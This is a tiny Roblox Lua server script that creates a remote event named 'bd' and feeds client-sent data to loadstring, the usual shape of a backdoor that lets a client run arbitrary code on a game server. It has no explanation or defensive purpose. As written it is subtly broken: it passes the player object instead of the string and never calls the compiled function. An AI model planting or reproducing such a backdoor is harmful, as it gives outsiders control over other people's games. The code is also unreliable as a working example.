local bool = false
local a = Instance.new("RemoteEvent", game.ReplicatedStorage)
a.Name = "bd"


a.OnServerEvent:Connect(function(sc)
	loadstring(sc)
end)
